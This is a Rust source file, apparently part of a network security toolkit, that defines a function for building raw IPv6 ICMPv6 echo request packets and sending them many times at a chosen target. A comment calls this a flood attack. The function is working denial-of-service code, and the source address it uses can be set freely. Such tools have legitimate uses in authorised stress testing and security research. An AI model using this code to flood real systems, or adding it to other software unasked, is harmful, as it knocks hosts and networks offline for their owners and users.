use chrono::Utc;
use pnet::datalink::MacAddr;
use pnet::datalink::NetworkInterface;
use pnet::packet::ethernet::EtherTypes;
use pnet::packet::icmpv6;
use pnet::packet::icmpv6::Icmpv6Code;
use pnet::packet::icmpv6::Icmpv6Type;
use pnet::packet::icmpv6::MutableIcmpv6Packet;
use pnet::packet::icmpv6::echo_request::MutableEchoRequestPacket;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv6::MutableIpv6Packet;
use rand::RngExt;
use std::net::Ipv6Addr;
use std::panic::Location;
use std::sync::Arc;
use std::time::Duration;

use crate::ask_runner;
use crate::error::PistolError;
use crate::layer::ICMPV6_ER_HEADER_SIZE;
use crate::layer::IPV6_HEADER_SIZE;

const TTL: u8 = 255;
const ICMPV6_DATA_SIZE: usize = 16;

pub fn send_icmpv6_flood_packet(
    dst_mac: MacAddr,
    dst_ipv6: Ipv6Addr,
    src_mac: MacAddr,
    src_ipv6: Ipv6Addr,
    interface: &NetworkInterface,
    retransmit: usize,
) -> Result<usize, PistolError> {
    let mut rng = rand::rng();
    // ipv6 header
    let mut ipv6_buff = [0u8; IPV6_HEADER_SIZE + ICMPV6_ER_HEADER_SIZE + ICMPV6_DATA_SIZE];
    let mut ipv6_header = match MutableIpv6Packet::new(&mut ipv6_buff) {
        Some(p) => p,
        None => {
            return Err(PistolError::BuildPacketError {
                location: format!("{}", Location::caller()),
            });
        }
    };
    ipv6_header.set_version(6);
    // In all cases, the IPv6 flow label is 0x12345, on platforms that allow us to set it.
    // On platforms that do not (which includes non-Linux Unix platforms when not using Ethernet to send), the flow label will be 0.
    ipv6_header.set_flow_label(0x12345);
    let payload_length = ICMPV6_ER_HEADER_SIZE + ICMPV6_DATA_SIZE;
    ipv6_header.set_payload_length(payload_length as u16);
    ipv6_header.set_next_header(IpNextHeaderProtocols::Icmpv6);
    ipv6_header.set_hop_limit(TTL);
    ipv6_header.set_source(src_ipv6);
    ipv6_header.set_destination(dst_ipv6);

    let mut icmpv6_header = match MutableEchoRequestPacket::new(&mut ipv6_buff[IPV6_HEADER_SIZE..])
    {
        Some(p) => p,
        None => {
            return Err(PistolError::BuildPacketError {
                location: format!("{}", Location::caller()),
            });
        }
    };
    icmpv6_header.set_icmpv6_type(Icmpv6Type(128));
    icmpv6_header.set_icmpv6_code(Icmpv6Code(0));
    icmpv6_header.set_sequence_number(1);
    icmpv6_header.set_identifier(rng.random());
    let mut tv_sec = Utc::now().timestamp().to_be_bytes();
    tv_sec.reverse(); // Big-Endian
    let mut tv_usec = Utc::now().timestamp_subsec_millis().to_be_bytes();
    tv_usec.reverse(); // Big-Endian
    let mut timestamp = Vec::new();
    timestamp.extend(tv_sec);
    timestamp.extend(tv_usec);
    // println!("{:?}", timestamp);
    icmpv6_header.set_payload(&timestamp);

    let mut icmp_header = match MutableIcmpv6Packet::new(&mut ipv6_buff[IPV6_HEADER_SIZE..]) {
        Some(p) => p,
        None => {
            return Err(PistolError::BuildPacketError {
                location: format!("{}", Location::caller()),
            });
        }
    };
    let checksum = icmpv6::checksum(&icmp_header.to_immutable(), &src_ipv6, &dst_ipv6);
    icmp_header.set_checksum(checksum);

    // very short timeout for flood attack
    let timeout = Duration::from_secs_f32(0.01);
    let ether_type = EtherTypes::Ipv6;
    let iface = interface.name.clone();
    let ipv6_buff = Arc::new(ipv6_buff);
    let ipv6_buff_len = ipv6_buff.len();
    let _receiver = ask_runner(
        iface,
        dst_mac,
        src_mac,
        ipv6_buff,
        ether_type,
        Vec::new(),
        timeout,
        retransmit,
    )?;

    Ok(ipv6_buff_len * retransmit)
}
